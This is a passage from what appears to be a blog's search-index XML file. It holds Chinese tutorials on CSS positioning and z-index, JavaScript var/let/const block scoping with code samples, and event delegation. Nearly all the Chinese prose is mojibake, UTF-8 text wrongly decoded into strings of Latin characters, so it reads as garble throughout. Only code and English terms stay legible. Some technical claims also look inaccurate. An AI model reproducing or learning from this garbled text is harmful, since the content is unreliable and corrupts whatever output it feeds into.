çš„æƒ…å†µä¸‹ï¼Œå­˜åœ¨æ–‡æœ¬ï¼Œåˆ™ä»¥æ–‡æœ¬çš„åº•éƒ¨ä¸ºåŽŸå§‹ç‚¹è¿›è¡Œå®šä½å¹¶å°†æ–‡å­—æ–­å¼€(å’Œabsolutä¸åŒ)ã€‚ å¦‚æžœè®¾å®šTRBLï¼Œå¹¶ä¸”çˆ¶çº§æ²¡æœ‰è®¾å®špositionå±žæ€§ï¼Œä»æ—§ä»¥çˆ¶çº§çš„å·¦ä¸Šè§’ä¸ºåŽŸç‚¹è¿›è¡Œå®šä½(å’Œabsolutä¸åŒ)ã€‚ å¦‚æžœè®¾å®šTRBLï¼Œå¹¶ä¸”çˆ¶çº§è®¾å®špositionå±žæ€§(æ— è®ºæ˜¯absoluteè¿˜æ˜¯relative)ï¼Œåˆ™ä»¥çˆ¶çº§çš„å·¦ä¸Šè§’ä¸ºåŽŸç‚¹è¿›è¡Œå®šä½ï¼Œä½ç½® ç”±TRBLå†³å®š(å‰åŠæ®µå’Œabsoluteä¸€æ ·)ã€‚å¦‚æžœçˆ¶çº§æœ‰Paddingå±žæ€§ï¼Œé‚£ä¹ˆå°±ä»¥å†…å®¹åŒºåŸŸçš„å·¦ä¸Šè§’ä¸ºåŽŸç‚¹ï¼Œè¿›è¡Œå®šä½(åŽåŠæ®µå’Œabsolutä¸ åŒ)ã€‚ ä»¥ä¸Šä¸‰ç‚¹å¯ä»¥æ€»ç»“å‡ºï¼Œæ— è®ºçˆ¶çº§å­˜åœ¨ä¸å­˜åœ¨ï¼Œæ— è®ºæœ‰æ²¡æœ‰TRBLï¼Œå‡æ˜¯ä»¥çˆ¶çº§çš„å·¦ä¸Šè§’è¿›è¡Œå®šä½ï¼Œä½†æ˜¯çˆ¶çº§çš„Paddingå±žæ€§ä¼šå¯¹å…¶å½±å“ã€‚ç»¼åˆä¸Šé¢å¯¹relativeçš„å™è¿°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†positionå±žæ€§ä¸ºrelativeçš„DIVè§†æˆå¯ä»¥ç”¨TRBLè¿›è¡Œå®šä½çš„çš„æ™®é€šDIVï¼Œæˆ–è€…è¯´ åªè¦å°†æˆ‘ä»¬å¹³æ—¶å¸ƒå±€é¡µé¢çš„divçš„CSSå±žæ€§ä¸­åŠ ä¸Šposition:relativeåŽï¼Œå°±ä¸åªæ˜¯ç”¨floatå¸ƒå±€é¡µé¢äº†ï¼Œè¿˜å¯ä»¥ç”¨TRBLè¿›è¡Œå¸ƒå±€é¡µ é¢ äº†ï¼Œæˆ–è€…è¯´åŠ ä¸Šposition:relativeçš„DIVä¹Ÿå¯ä»¥åƒæ™®é€šçš„DIVè¿›è¡Œå¸ƒå±€é¡µé¢äº†ï¼Œåªä¸è¿‡è¿˜å¯ä»¥ç”¨TRBLè¿›è¡Œå¸ƒå±€é¡µé¢ã€‚ä½†æ˜¯ positionå±žæ€§ä¸ºabsoluteä¸å¯ä»¥ç”¨æ¥å¸ƒå±€é¡µé¢ï¼Œå› ä¸ºå¦‚æžœç”¨æ¥å¸ƒå±€çš„è¯ï¼Œæ‰€æœ‰çš„DIVéƒ½ç›¸å¯¹äºŽæµè§ˆå™¨çš„å·¦ä¸Šè§’å®šä½äº†ï¼Œæ‰€ä»¥åªèƒ½ç”¨äºŽå°†æŸä¸ªå…ƒç´  å®šä½äºŽå±žæ€§ä¸ºabsoluteçš„å…ƒç´ çš„å†…éƒ¨æŸä¸ªä½ç½®ã€‚ Topçš„å€¼è¡¨ç¤ºå¯¹è±¡ç›¸å¯¹åŽŸä½ç½®å‘ä¸‹åç§»çš„è·ç¦»ï¼Œbottomçš„å€¼è¡¨ç¤ºå¯¹è±¡ç›¸å¯¹åŽŸä½ç½®å‘ä¸Šåç§»çš„è·ç¦»ï¼Œä¸¤è€…åŒæ—¶å­˜åœ¨æ—¶ï¼Œåªæœ‰Topèµ·ä½œç”¨ã€‚ leftçš„å€¼è¡¨ç¤ºå¯¹è±¡ç›¸å¯¹åŽŸä½ç½®å‘å³åç§»çš„è·ç¦»ï¼Œrightçš„å€¼è¡¨ç¤ºå¯¹è±¡ç›¸å¯¹åŽŸä½ç½®å‘å·¦åç§»çš„è·ç¦»ï¼Œä¸¤è€…åŒæ—¶å­˜åœ¨æ—¶ï¼Œåªæœ‰leftèµ·ä½œç”¨ã€‚ absoluteå®šä½ä¸ºabsoluteçš„å±‚è„±ç¦»æ­£å¸¸æ–‡æœ¬æµï¼Œä½†ä¸Žrelativeçš„åŒºåˆ«æ˜¯å…¶åœ¨æ­£å¸¸æµä¸­çš„ä½ç½®ä¸å†å­˜åœ¨ã€‚ è¿™ä¸ªå±žæ€§æ€»æ˜¯æœ‰äººç»™å‡ºè¯¯å¯¼ã€‚è¯´å½“positionå±žæ€§è®¾ä¸ºabsoluteåŽï¼Œæ€»æ˜¯æŒ‰ç…§æµè§ˆå™¨çª—å£æ¥è¿›è¡Œå®šä½çš„ï¼Œè¿™å…¶å®žæ˜¯é”™è¯¯çš„ã€‚å®žé™…ä¸Šï¼Œè¿™æ˜¯fixedå±žæ€§çš„ç‰¹ç‚¹ã€‚ å¦‚æžœæ²¡æœ‰TRBL(topã€rightã€bottomã€left)ï¼Œä»¥çˆ¶çº§çš„å·¦ä¸Šè§’ï¼Œåœ¨æ²¡æœ‰çˆ¶çº§çš„æ—¶å€™ï¼Œä»–æ˜¯å‚ç…§æµè§ˆå™¨å·¦ä¸Šè§’,å¦‚æžœåœ¨æ²¡æœ‰çˆ¶çº§å…ƒç´ çš„æƒ…å†µä¸‹ï¼Œå­˜åœ¨æ–‡æœ¬ï¼Œåˆ™ä»¥å®ƒå‰é¢çš„æœ€åŽä¸€ä¸ªæ–‡å­—çš„å³ä¸Šè§’ä¸ºåŽŸç‚¹è¿›è¡Œå®šä½ä½†æ˜¯ä¸æ–­å¼€æ–‡å­—ï¼Œè¦†ç›–äºŽä¸Šæ–¹ã€‚ å¦‚æžœè®¾å®šTRBLï¼Œå¹¶ä¸”çˆ¶çº§æ²¡æœ‰è®¾å®špositionå±žæ€§ï¼Œé‚£ä¹ˆå½“å‰çš„absoluteåˆ™ä»¥æµè§ˆå™¨å·¦ä¸Šè§’ä¸ºåŽŸå§‹ç‚¹è¿›è¡Œå®šä½ï¼Œä½ç½®å°†ç”±TRBLå†³å®šã€‚ å¦‚æžœè®¾å®šTRBLï¼Œå¹¶ä¸”çˆ¶çº§è®¾å®špositionå±žæ€§(æ— è®ºæ˜¯absoluteè¿˜æ˜¯relative)ï¼Œåˆ™ä»¥çˆ¶çº§çš„å·¦ä¸Šè§’ä¸ºåŽŸç‚¹è¿›è¡Œå®šä½ï¼Œä½ç½®ç”± TRBLå†³å®šã€‚å³ä½¿çˆ¶çº§æœ‰Paddingå±žæ€§ï¼Œå¯¹å…¶ä¹Ÿä¸èµ·ä½œç”¨ï¼Œè¯´ç®€å•ç‚¹å°±æ˜¯ï¼šå®ƒåªåšæŒä¸€ç‚¹ï¼Œå°±ä»¥çˆ¶çº§å·¦ä¸Šè§’ä¸ºåŽŸç‚¹è¿›è¡Œå®šä½ï¼Œçˆ¶çº§çš„paddingå¯¹å…¶æ ¹æœ¬æ²¡æœ‰å½±å“ã€‚ ä»¥ä¸Šä¸‰ç‚¹å¯ä»¥æ€»ç»“å‡ºï¼Œè‹¥æƒ³æŠŠä¸€ä¸ªå®šä½å±žæ€§ä¸ºabsoluteçš„å…ƒç´ å®šä½äºŽå…¶çˆ¶çº§å…ƒç´ å†…ï¼Œåªæœ‰æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š ç¬¬ä¸€ï¼šè®¾å®šTRBL ç¬¬äºŒï¼šçˆ¶çº§è®¾å®šPositionå±žæ€§ ä¸Šé¢çš„è¿™ä¸ªæ€»ç»“éžå¸¸é‡è¦ï¼Œå¯ä»¥ä¿è¯ä½ åœ¨ç”¨absolueå¸ƒå±€é¡µé¢çš„æ—¶å€™ï¼Œä¸ä¼šé”™ä½ï¼Œå¹¶ä¸”éšç€æµè§ˆå™¨çš„å¤§å°æˆ–è€…æ˜¾ç¤ºå™¨åˆ†è¾¨çŽ‡çš„å¤§å°ï¼Œè€Œä¸å‘ç”Ÿæ”¹å˜ã€‚ åªè¦æœ‰ä¸€ç‚¹ä¸æ»¡è¶³ï¼Œå…ƒç´ å°±ä¼šä»¥æµè§ˆå™¨å·¦ä¸Šè§’ä¸ºåŽŸç‚¹ï¼Œè¿™å°±æ˜¯åˆå­¦è€…å®¹æ˜“çŠ¯é”™çš„ä¸€ç‚¹ï¼Œå·²ç»å®šä½å¥½çš„æ¿å—ï¼Œå½“æµè§ˆå™¨çš„å¤§å°æ”¹å˜ï¼Œçˆ¶çº§å…ƒç´ ä¼šéšä¹‹æ”¹å˜ï¼Œä½†æ˜¯è®¾ å®šPositionå±žæ€§ä¸ºabsoluteçš„æ¿å—å’Œçˆ¶çº§å…ƒç´ çš„ä½ç½®å‘ç”Ÿæ”¹å˜ï¼Œé”™ä½äº†ï¼Œè¿™å°±æ˜¯å› ä¸ºæ­¤æ—¶å…ƒç´ ä»¥æµè§ˆå™¨çš„å³ä¸Šè§’ä¸ºåŽŸç‚¹çš„åŽŸå› ã€‚åˆå­¦è€…å¾ˆå®¹æ˜“çŠ¯é”™çš„æ˜¯ï¼Œä¸æ¸…æ¥šPositionå±žæ€§ä¸ºabsoluteçš„æ¿å—ï¼Œè‹¥æƒ³å®šä½åˆ°çˆ¶çº§æ¿å—ä¸­ï¼Œå¹¶ä¸”å½“æµè§ˆå™¨çš„å¤§å°æ”¹å˜æˆ–æ˜¾ç¤ºå™¨çš„åˆ†è¾¨çŽ‡æ”¹å˜ï¼Œå¸ƒå±€ä¸å‘ç”Ÿæ”¹å˜ï¼Œæ˜¯éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶çš„ï¼Œåªè¦æœ‰ä¸€ç‚¹ä¸æ»¡è¶³ï¼Œå…ƒç´ å°±ä¼šä»¥æµè§ˆå™¨å·¦ä¸Šè§’ä¸ºåŽŸç‚¹ï¼Œä»Žè€Œå¯¼è‡´é¡µé¢å¸ƒå±€é”™ä½ã€‚ Topçš„å€¼è¡¨ç¤ºå¯¹è±¡ä¸Šè¾¹æ¡†ä¸Žæµè§ˆå™¨çª—å£é¡¶éƒ¨çš„è·ç¦»ï¼Œbottomçš„å€¼è¡¨ç¤ºå¯¹è±¡ä¸‹è¾¹æ¡†ä¸Žæµè§ˆå™¨çª—å£åº•éƒ¨çš„è·ç¦»ï¼Œä¸¤è€…åŒæ—¶å­˜åœ¨æ—¶ï¼Œåªæœ‰Topèµ·ä½œç”¨ï¼›å¦‚æžœä¸¤è€…éƒ½æœªæŒ‡å®šï¼Œåˆ™å…¶é¡¶ç«¯å°†ä¸ŽåŽŸæ–‡æ¡£æµä½ç½®ä¸€è‡´ï¼Œå³åž‚ç›´ä¿æŒä½ç½®ä¸å˜ã€‚ leftçš„å€¼è¡¨ç¤ºå¯¹è±¡å·¦è¾¹æ¡†ä¸Žæµè§ˆå™¨çª—å£å·¦è¾¹çš„è·ç¦»ï¼Œrightçš„å€¼è¡¨ç¤ºå¯¹è±¡å³è¾¹æ¡†ä¸Žæµè§ˆå™¨çª—å£å³è¾¹çš„è·ç¦»ï¼Œä¸¤è€…åŒæ—¶å­˜åœ¨æ—¶ï¼Œåªæœ‰leftèµ·ä½œç”¨ï¼›å¦‚æžœä¸¤è€…éƒ½æœªæŒ‡å®šï¼Œåˆ™å…¶å·¦è¾¹å°†ä¸ŽåŽŸæ–‡æ¡£æµä½ç½®ä¸€è‡´ï¼Œå³æ°´å¹³ä¿æŒä½ç½®ä¸å˜ã€‚ åœ¨Positionå±žæ€§å€¼ä¸ºabsoluteçš„åŒæ—¶ï¼Œå¦‚æžœæœ‰ä¸€çº§çˆ¶å¯¹è±¡ï¼ˆæ— è®ºæ˜¯çˆ¶å¯¹è±¡è¿˜æ˜¯ç¥–çˆ¶å¯¹è±¡ï¼Œæˆ–è€…å†é«˜çš„è¾ˆåˆ†ï¼Œä¸€æ ·ï¼‰çš„Positionå±žæ€§å€¼ä¸ºRelativeæ—¶ï¼Œåˆ™ä¸Šè¿°çš„ç›¸å¯¹æµè§ˆå™¨çª—å£å®šä½å°†ä¼šå˜æˆç›¸å¯¹çˆ¶å¯¹è±¡å®šä½ï¼Œè¿™å¯¹ç²¾ç¡®å®šä½æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚ relativeä¸Žabsoluteçš„ä¸»è¦åŒºåˆ«relativeå®šä½çš„å±‚æ€»æ˜¯ç›¸å¯¹äºŽå…¶æœ€è¿‘çš„çˆ¶å…ƒç´ ï¼Œæ— è®ºå…¶çˆ¶å…ƒç´ æ˜¯ä½•ç§å®šä½æ–¹å¼ å¯¹äºŽabsoluteå®šä½çš„å±‚æ€»æ˜¯ç›¸å¯¹äºŽå…¶æœ€è¿‘çš„å®šä¹‰ä¸ºabsoluteæˆ–relativeçš„çˆ¶å±‚ï¼Œè€Œè¿™ä¸ªçˆ¶å±‚å¹¶ä¸ä¸€å®šæ˜¯å…¶ç›´æŽ¥çˆ¶å±‚ã€‚å¦‚æžœå…¶çˆ¶å±‚ä¸­éƒ½æœªå®šä¹‰absoluteæˆ–relativeï¼Œåˆ™å…¶å°†ç›¸å¯¹bodyè¿›è¡Œå®šä½ æ€»ç»“å±žæ€§ä¸ºrelativeçš„å…ƒç´ å¯ä»¥ç”¨æ¥å¸ƒå±€é¡µé¢ï¼Œå±žæ€§ä¸ºabsoluteçš„å…ƒç´ ç”¨æ¥å®šä½æŸå…ƒç´ åœ¨çˆ¶çº§ä¸­çš„ä½ç½®ï¼Œæ—¢ç„¶å±žæ€§ä¸ºabsoluteçš„å…ƒç´ ç”¨æ¥å®šä½æŸå…ƒç´ åœ¨çˆ¶çº§ä¸­ä½ç½®ï¼Œå°±å°‘ä¸äº†TRBLï¼Œè¿™æ—¶å€™æ ¹æ®ä¸€å¼€å§‹è®²çš„absoluteçš„ç¬¬ä¸‰æ¡ï¼Œå¦‚æžœçˆ¶çº§å…ƒç´ æ²¡æœ‰positionå±žæ€§é‚£ä¹ˆ absoluteå…ƒç´ å°±ä¼šè„±ç¦»çˆ¶çº§å…ƒç´ ï¼Œä½†æ˜¯å¦‚æžœæ˜¯å¸ƒå±€é¡µé¢ï¼Œçˆ¶çº§å…ƒç´ positionçš„å±žæ€§åˆä¸èƒ½ä¸ºabsoluteï¼Œä¸ç„¶å°±ä¼šä»¥æµè§ˆå™¨å·¦ä¸Šè§’ä¸ºåŽŸç‚¹ äº†ï¼Œæ‰€ä»¥çˆ¶çº§å…ƒç´ çš„positionå±žæ€§åªèƒ½ä¸ºrelative å¦‚æžœç”¨positionæ¥å¸ƒå±€é¡µé¢ï¼Œçˆ¶çº§å…ƒç´ çš„positionå±žæ€§å¿…é¡»ä¸ºrelativeï¼Œè€Œå®šä½äºŽçˆ¶çº§å†…éƒ¨æŸä¸ªä½ç½®çš„å…ƒç´ ï¼Œæœ€å¥½ç”¨ absoluteï¼Œå› ä¸ºå®ƒä¸å—çˆ¶çº§å…ƒç´ çš„paddingçš„å±žæ€§å½±å“ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥ç”¨positionï¼Œä¸è¿‡åˆ°æ—¶å€™è®¡ç®—çš„æ—¶å€™ä¸è¦å¿˜è®°paddingçš„å€¼ Note : ç»å¯¹(absolute)å®šä½å¯¹è±¡åœ¨å¯è§†åŒºåŸŸä¹‹å¤–ä¼šå¯¼è‡´æ»šåŠ¨æ¡å‡ºçŽ°ã€‚è€Œæ”¾ç½®ç›¸å¯¹(relative)å®šä½å¯¹è±¡åœ¨å¯è§†åŒºåŸŸä¹‹å¤–ï¼Œæ»šåŠ¨æ¡ä¸ä¼šå‡ºçŽ°ã€‚ ä»€ä¹ˆæ˜¯æ–‡æ¡£æµï¼Ÿ å°†çª—ä½“è‡ªä¸Šè€Œä¸‹åˆ†æˆä¸€è¡Œè¡Œ, å¹¶åœ¨æ¯è¡Œä¸­æŒ‰ä»Žå·¦è‡³å³çš„é¡ºåºæŽ’æ”¾å…ƒç´ ,å³ä¸ºæ–‡æ¡£æµã€‚åªæœ‰ä¸‰ç§æƒ…å†µä¼šä½¿å¾—å…ƒç´ è„±ç¦»æ–‡æ¡£æµï¼Œåˆ†åˆ«æ˜¯ï¼šæµ®åŠ¨ç»å¯¹å®šä½å’Œç›¸å¯¹å®šä½ã€‚ z-indexå±žæ€§ z-indexï¼Œåˆç§°ä¸ºå¯¹è±¡çš„å±‚å é¡ºåºï¼Œå®ƒç”¨ä¸€ä¸ªæ•´æ•°æ¥å®šä¹‰å †å çš„å±‚æ¬¡ï¼Œæ•´æ•°å€¼è¶Šå¤§ï¼Œåˆ™è¢«å±‚å åœ¨è¶Šä¸Šé¢ï¼Œå½“ç„¶è¿™æ˜¯æŒ‡åŒçº§å…ƒç´ é—´çš„å †å ï¼Œå¦‚æžœä¸¤ä¸ªå¯¹è±¡çš„æ­¤å±ž æ€§å…·æœ‰åŒæ ·çš„å€¼ï¼Œé‚£ä¹ˆå°†ä¾æ®å®ƒä»¬åœ¨HTMLæ–‡æ¡£ä¸­æµçš„é¡ºåºå±‚å ï¼Œå†™åœ¨åŽé¢çš„å°†ä¼šè¦†ç›–å‰é¢çš„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œçˆ¶å­å…³ç³»æ˜¯æ— æ³•ç”¨z-indexæ¥è®¾å®šä¸Šä¸‹å…³ç³» çš„ï¼Œä¸€å®šæ˜¯å­çº§åœ¨ä¸Šçˆ¶çº§åœ¨ä¸‹ã€‚Noteï¼šä½¿ç”¨static å®šä½æˆ–æ— positionå®šä½çš„å…ƒç´ z-indexå±žæ€§æ˜¯æ— æ•ˆçš„ã€‚]]></content>
      <categories>
        <category>ç•Œé¢å¸ƒå±€</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[varã€letã€constä¸‰è€…çš„åŒºåˆ«]]></title>
    <url>%2F2018-05-15-var-let-const.html</url>
    <content type="text"><![CDATA[JSä¸­çš„å—çº§ä½œç”¨åŸŸï¼Œvarã€letã€constä¸‰è€…çš„åŒºåˆ«é¦–å…ˆï¼ŒECMAScriptå’ŒJavaScriptå…³ç³»ï¼š ECMAScriptæ˜¯ä¸€ä¸ªå›½é™…é€šè¿‡çš„æ ‡å‡†åŒ–è„šæœ¬è¯­è¨€ã€‚JavaScriptç”±ECMAScriptå’ŒDOMã€BOMä¸‰è€…ç»„æˆã€‚å¯ä»¥ç®€å•ç†è§£ä¸ºï¼šECMAScriptæ˜¯JavaScriptçš„è¯­è¨€è§„èŒƒï¼ŒJavaScriptæ˜¯ECMAScriptçš„å®žçŽ°å’Œæ‰©å±•ã€‚ å—ä½œç”¨åŸŸ{ }JSä¸­ä½œç”¨åŸŸæœ‰ï¼šå…¨å±€ä½œç”¨åŸŸã€å‡½æ•°ä½œç”¨åŸŸã€‚æ²¡æœ‰å—ä½œç”¨åŸŸçš„æ¦‚å¿µã€‚ECMAScript 6(ç®€ç§°ES6)ä¸­æ–°å¢žäº†å—çº§ä½œç”¨åŸŸã€‚å—ä½œç”¨åŸŸç”± { } åŒ…æ‹¬ï¼Œifè¯­å¥å’Œforè¯­å¥é‡Œé¢çš„{ }ä¹Ÿå±žäºŽå—ä½œç”¨åŸŸã€‚ 12345678910111213141516171819202122232425&#123; var a = 1; console.log(a); // 1&#125;console.log(a); // 1// å¯è§ï¼Œé€šè¿‡varå®šä¹‰çš„å˜é‡å¯ä»¥è·¨å—ä½œç”¨åŸŸè®¿é—®åˆ°ã€‚(function A() &#123; var b = 2; console.log(b); // 2&#125;)();// console.log(b); // æŠ¥é”™ï¼Œ// å¯è§ï¼Œé€šè¿‡varå®šä¹‰çš„å˜é‡ä¸èƒ½è·¨å‡½æ•°ä½œç”¨åŸŸè®¿é—®åˆ°if(true) &#123; var c = 3;&#125;console.log(c); // 3for(var i = 0; i &lt; 4; i ++) &#123; var d = 5;&#125;;console.log(i); // 4 (å¾ªçŽ¯ç»“æŸiå·²ç»æ˜¯4ï¼Œæ‰€ä»¥æ­¤å¤„iä¸º4)console.log(d); // 5// ifè¯­å¥å’Œforè¯­å¥ä¸­ç”¨varå®šä¹‰çš„å˜é‡å¯ä»¥åœ¨å¤–é¢è®¿é—®åˆ°ï¼Œ// å¯è§ï¼Œifè¯­å¥å’Œforè¯­å¥å±žäºŽå—ä½œç”¨åŸŸï¼Œä¸å±žäºŽå‡½æ•°ä½œç”¨åŸŸã€‚ varã€letã€constçš„åŒºåˆ«varå®šä¹‰çš„å˜é‡ï¼Œæ²¡æœ‰å—çš„æ¦‚å¿µï¼Œå¯ä»¥è·¨å—è®¿é—®, ä¸èƒ½è·¨å‡½æ•°è®¿é—®ã€‚letå®šä¹‰çš„å˜é‡ï¼Œåªèƒ½åœ¨å—ä½œç”¨åŸŸé‡Œè®¿é—®ï¼Œä¸èƒ½è·¨å—è®¿é—®ï¼Œä¹Ÿä¸èƒ½è·¨å‡½æ•°è®¿é—®ã€‚constç”¨æ¥å®šä¹‰å¸¸é‡ï¼Œä½¿ç”¨æ—¶å¿…é¡»åˆå§‹åŒ–(å³å¿…é¡»èµ‹å€¼)ï¼Œåªèƒ½åœ¨å—ä½œç”¨åŸŸé‡Œè®¿é—®ï¼Œè€Œä¸”ä¸èƒ½ä¿®æ”¹ã€‚ 123456789101112131415161718// å—ä½œç”¨åŸŸ&#123;var a = 1; let b = 2;const c = 3;// c = 4; // æŠ¥é”™var aa;let bb;// const cc; // æŠ¥é”™console.log(a); // 1console.log(b); // 2console.log(c); // 3console.log(aa); // undefinedconsole.log(bb); // undefined&#125;console.log(a); // 1// console.log(b); // æŠ¥é”™// console.log(c); // æŠ¥é”™ 12345678910111213// å‡½æ•°ä½œç”¨åŸŸ(function A() &#123; var d = 5; let e = 6; const f = 7; console.log(d); // 5 console.log(e); // 6 (åœ¨åŒä¸€ä¸ª&#123; &#125;ä¸­,ä¹Ÿå±žäºŽåŒä¸€ä¸ªå—ï¼Œå¯ä»¥æ­£å¸¸è®¿é—®åˆ°) console.log(f); // 7 (åœ¨åŒä¸€ä¸ª&#123; &#125;ä¸­,ä¹Ÿå±žäºŽåŒä¸€ä¸ªå—ï¼Œå¯ä»¥æ­£å¸¸è®¿é—®åˆ°)&#125;)();// console.log(d); // æŠ¥é”™// console.log(e); // æŠ¥é”™// console.log(f); // æŠ¥é”™]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[äº‹ä»¶å§”æ´¾]]></title>
    <url>%2F2018-05-15-eventDelegation.html</url>
    <content type="text"><![CDATA[jsä¸­çš„äº‹ä»¶å§”æ‰˜æˆ–æ˜¯äº‹ä»¶ä»£ç†è¯¦è§£æ¦‚å¿µé‚£ä»€ä¹ˆå«äº‹ä»¶å§”æ‰˜å‘¢ï¼Ÿå®ƒè¿˜æœ‰ä¸€ä¸ªåå­—å«äº‹ä»¶ä»£ç†ï¼ŒJavaScripté«˜çº§ç¨‹åºè®¾è®¡ä¸Šè®²ï¼šäº‹ä»¶å§”æ‰˜å°±æ˜¯åˆ©ç”¨äº‹ä»¶å†’æ³¡ï¼ŒåªæŒ‡å®šä¸€ä¸ªäº‹ä»¶å¤„ç†ç¨‹åºï¼Œå°±å¯ä»¥ç®¡ç†æŸä¸€ç±»åž‹çš„æ‰€æœ‰äº‹ä»¶ã€‚é‚£è¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿç½‘ä¸Šçš„å„ä½å¤§ç‰›ä»¬è®²äº‹ä»¶å§”æ‰˜åŸºæœ¬ä¸Šéƒ½ç”¨äº†åŒä¸€ä¸ªä¾‹å­ï¼Œå°±æ˜¯å–å¿«é€’æ¥è§£é‡Šè¿™ä¸ªçŽ°è±¡ï¼Œæˆ‘ä»”ç»†æ£æ‘©äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªä¾‹å­è¿˜çœŸæ˜¯æ°å½“ï¼Œæˆ‘å°±ä¸åŽ»æƒ³åˆ«çš„ä¾‹å­æ¥è§£é‡Šäº†ï¼Œå€ŸèŠ±çŒ®ä½›ï¼Œæˆ‘æ‘˜è¿‡æ¥ï¼Œå¤§å®¶è®¤çœŸé¢†ä¼šä¸€ä¸‹äº‹ä»¶å§”æ‰˜åˆ°åº•æ˜¯ä¸€ä¸ªä»€ä¹ˆåŽŸç†ï¼š æœ‰ä¸‰ä¸ªåŒäº‹é¢„è®¡ä¼šåœ¨å‘¨ä¸€æ”¶åˆ°å¿«é€’ã€‚ä¸ºç­¾æ”¶å¿«é€’ï¼Œæœ‰ä¸¤ç§åŠžæ³•ï¼šä¸€æ˜¯ä¸‰ä¸ªäººåœ¨å…¬å¸é—¨å£ç­‰å¿«é€’ï¼›äºŒæ˜¯å§”æ‰˜ç»™å‰å°MMä»£ä¸ºç­¾æ”¶ã€‚çŽ°å®žå½“ä¸­ï¼Œæˆ‘ä»¬å¤§éƒ½é‡‡ç”¨å§”æ‰˜çš„æ–¹æ¡ˆï¼ˆå…¬å¸ä¹Ÿä¸ä¼šå®¹å¿é‚£ä¹ˆå¤šå‘˜å·¥ç«™åœ¨é—¨å£å°±ä¸ºäº†ç­‰å¿«é€’ï¼‰ã€‚å‰å°MMæ”¶åˆ°å¿«é€’åŽï¼Œå¥¹ä¼šåˆ¤æ–­æ”¶ä»¶äººæ˜¯è°ï¼Œç„¶åŽæŒ‰ç…§æ”¶ä»¶äººçš„è¦æ±‚ç­¾æ”¶ï¼Œç”šè‡³ä»£ä¸ºä»˜æ¬¾ã€‚è¿™ç§æ–¹æ¡ˆè¿˜æœ‰ä¸€ä¸ªä¼˜åŠ¿ï¼Œé‚£å°±æ˜¯å³ä½¿å…¬å¸é‡Œæ¥äº†æ–°å‘˜å·¥ï¼ˆä¸ç®¡å¤šå°‘ï¼‰ï¼Œå‰å°MMä¹Ÿä¼šåœ¨æ”¶åˆ°å¯„ç»™æ–°å‘˜å·¥çš„å¿«é€’åŽæ ¸å®žå¹¶ä»£ä¸ºç­¾æ”¶ã€‚ è¿™é‡Œå…¶å®žè¿˜æœ‰2å±‚æ„æ€çš„ï¼š ç¬¬ä¸€ï¼ŒçŽ°åœ¨å§”æ‰˜å‰å°çš„åŒäº‹æ˜¯å¯ä»¥ä»£ä¸ºç­¾æ”¶çš„ï¼Œå³ç¨‹åºä¸­çš„çŽ°æœ‰çš„domèŠ‚ç‚¹æ˜¯æœ‰äº‹ä»¶çš„ï¼› ç¬¬äºŒï¼Œæ–°å‘˜å·¥ä¹Ÿæ˜¯å¯ä»¥è¢«å‰å°MMä»£ä¸ºç­¾æ”¶çš„ï¼Œå³ç¨‹åºä¸­æ–°æ·»åŠ çš„domèŠ‚ç‚¹ä¹Ÿæ˜¯æœ‰äº‹ä»¶çš„ã€‚ ä¸ºä»€ä¹ˆè¦ä½¿ç”¨äº‹ä»¶å§”æ‰˜ï¼Ÿä¸€èˆ¬æ¥è¯´ï¼Œdoméœ€è¦æœ‰äº‹ä»¶å¤„ç†ç¨‹åºï¼Œæˆ‘ä»¬éƒ½ä¼šç›´æŽ¥ç»™å®ƒè®¾äº‹ä»¶å¤„ç†ç¨‹åºå°±å¥½äº†ï¼Œé‚£å¦‚æžœæ˜¯å¾ˆå¤šçš„doméœ€è¦æ·»åŠ äº‹ä»¶å¤„ç†å‘¢ï¼Ÿæ¯”å¦‚æˆ‘ä»¬æœ‰100ä¸ªliï¼Œæ¯ä¸ªliéƒ½æœ‰ç›¸åŒçš„clickç‚¹å‡»äº‹ä»¶ï¼Œå¯èƒ½æˆ‘ä»¬ä¼šç”¨forå¾ªçŽ¯çš„æ–¹æ³•ï¼Œæ¥éåŽ†æ‰€æœ‰çš„liï¼Œç„¶åŽç»™å®ƒä»¬æ·»åŠ äº‹ä»¶ï¼Œé‚£è¿™ä¹ˆåšä¼šå­˜åœ¨ä»€ä¹ˆå½±å“å‘¢ï¼Ÿ åœ¨JavaScriptä¸­ï¼Œæ·»åŠ åˆ°é¡µé¢ä¸Šçš„äº‹ä»¶å¤„ç†ç¨‹åºæ•°é‡å°†ç›´æŽ¥å…³ç³»åˆ°é¡µé¢çš„æ•´ä½“è¿è¡Œæ€§èƒ½ï¼Œå› ä¸ºéœ€è¦ä¸æ–­çš„ä¸ŽdomèŠ‚ç‚¹è¿›è¡Œäº¤äº’ï¼Œè®¿é—®domçš„æ¬¡æ•°è¶Šå¤šï¼Œå¼•èµ·æµè§ˆå™¨é‡ç»˜ä¸Žé‡æŽ’çš„æ¬¡æ•°ä¹Ÿå°±è¶Šå¤šï¼Œå°±ä¼šå»¶é•¿æ•´ä¸ªé¡µé¢çš„äº¤äº’å°±ç»ªæ—¶é—´ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ€§èƒ½ä¼˜åŒ–çš„ä¸»è¦æ€æƒ³ä¹‹ä¸€å°±æ˜¯å‡å°‘DOMæ“ä½œçš„åŽŸå› ï¼›å¦‚æžœè¦ç”¨äº‹ä»¶å§”æ‰˜ï¼Œå°±ä¼šå°†æ‰€æœ‰çš„æ“ä½œæ”¾åˆ°jsç¨‹åºé‡Œé¢ï¼Œä¸Ždomçš„æ“ä½œå°±åªéœ€è¦äº¤äº’ä¸€æ¬¡ï¼Œè¿™æ ·å°±èƒ½å¤§å¤§çš„å‡å°‘ä¸Ždomçš„äº¤äº’æ¬¡æ•°ï¼Œæé«˜æ€§èƒ½ï¼› 